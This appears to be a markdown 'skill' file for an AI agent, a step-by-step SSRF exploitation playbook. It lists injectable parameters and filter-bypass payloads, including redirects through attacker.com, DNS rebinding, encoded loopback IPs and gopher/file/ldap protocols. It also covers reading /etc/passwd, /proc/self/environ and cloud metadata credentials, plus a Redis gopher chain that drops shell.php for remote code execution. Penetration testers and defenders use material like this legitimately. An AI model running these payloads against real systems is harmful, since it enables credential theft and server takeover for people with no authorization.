---
name: ssrf
description: Use when an app fetches user-supplied URLs - webhooks, proxies, image/PDF importers, RSS/feed readers, link previews, URL shorteners, cloud metadata - or when the user says "SSRF", "server side request forgery", "internal network". Full SSRF methodology: finding sinks, bypassing filters (DNS, IP tricks, redirects, protocols), cloud metadata, and blind/OOB confirmation.
---

# Server-Side Request Forgery (SSRF)

SSRF = the app fetches a URL you control. Highest impact: internal network access, cloud metadata → credentials, RCE via internal services.

## Step 1: Find the sink

Params where the server fetches a remote resource:
- `url=`, `uri=`, `link=`, `src=`, `image_url=`, `avatar=`, `callback=`, `webhook=`, `redirect=`, `proxy=`, `feed=`, `import=`, `upload-from-url=`, `preview=`, `pdf-url=`, `fetch=`, `target=`, `domain=`, `host=`, `ip=`.
- Features: URL previews, PDF/HTML to image converters, SSO metadata import, RSS readers, mail parsers (MIME → fetch), avatar fetchers, "fetch article" bots, webhook senders, screenshot APIs.

## Step 2: Baseline

Send `http://example.com/<canary>` to your own OOB endpoint (`oob_listener.py` gives you a callback domain). If you get a hit → SSRF CONFIRMED. From there, escalate.

## Step 3: Bypass filters (in order)

1. **Redirects**: `http://attacker.com/redirect?to=http://169.254.169.254/` — many apps follow redirects but block the direct URL.
2. **DNS rebinding**: use a domain that resolves to your server first, then to `127.0.0.1` (e.g., `1u.ms` / `rbndr.us` rebinding services, or your own).
3. **IP tricks**: `2130706433` (127.0.0.1 decimal), `0177.0.0.1` (octal), `127.1`, `0x7f000001`, `[::ffff:127.0.0.1]`, `127.0.0.1.nip.io`, `localtest.me`, `spoofed.burpcollaborator.net`.
4. **Hostname bypass**: `http://localhost:6379@attacker.com` (userinfo trick), `http://attacker.com#@127.0.0.1/`, backslash `http://127.0.0.1\@attacker.com`.
5. **DNS resolution**: some filters resolve once — use `http://169.254.169.254.nip.io/` or a domain pointing to the IP (e.g., `metadata.google.internal`).
6. **Protocols**: `gopher://` (Redis, internal TCP), `dict://`, `file://` (read files), `ftp://`, `ldap://` (JNDI), `jar://`, `phar://`.
7. **Double URL encoding**: `%252f` etc. — rarely works but try.
8. **Whitespace/case**: `HTTP://`, ` http://`, tabs/newlines inside URL.

## Step 4: Escalate

- **Cloud metadata** (see `cloud-security` skill for exact endpoints/headers).
- **Internal services**: `http://127.0.0.1:6379` (Redis `gopher://` payload for RCE), `http://127.0.0.1:9200/_cat/indices`, `http://127.0.0.1:8080/actuator/env`, `http://127.0.0.1:3000` (internal app), `http://<db-host>:5432`.
- **File read**: `file:///etc/passwd` (blocked in most but try), `file:///proc/self/environ` (secrets).
- **RCE**: gopher → Redis `EVAL`/`CONFIG SET dir /var/www/html; set dbfilename shell.php`, or internal Spring actuator `/env` + `/refresh` (jolokia).

## Step 5: Blind SSRF (OOB)

If no response content is reflected: use `python tools/oob_listener.py` (interactsh). Inject your callback URL; inbound DNS/HTTP hit = CONFIRMED blind SSRF. Then chain: `http://<callback>/` → any internal URL via redirect.

## Validation & Reporting

- CONFIRMED: OOB callback received, or response contains internal content (metadata keys, redis `PONG`, index listing).
- Severity: SSRF→metadata creds (Critical), SSRF→internal RCE (Critical), SSRF→internal HTTP (High), blind SSRF (Medium/High).
- Report: sink param, bypass used, target reached, evidence (callback log or response), impact.
- Never fetch internal data that isn't needed for proof; redact credentials.

## Tools

```
python tools/oob_listener.py                     # interactsh callback (blind confirmation)
python tools/deser_probe.py --ssrf-check <url>   # detection helpers
bash   tools/vuln_scanner.sh                     # pipeline
python tools/validate.py "<finding>"
```

## References

- PortSwigger SSRF labs: https://portswigger.net/web-security/ssrf
- SSRF bypass cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- Cloud metadata endpoints (AWS/GCP/Azure): see cloud-security skill
- gopher/RCE SSRF: https://book.hacktricks.wiki/en/pentesting-web/ssrf
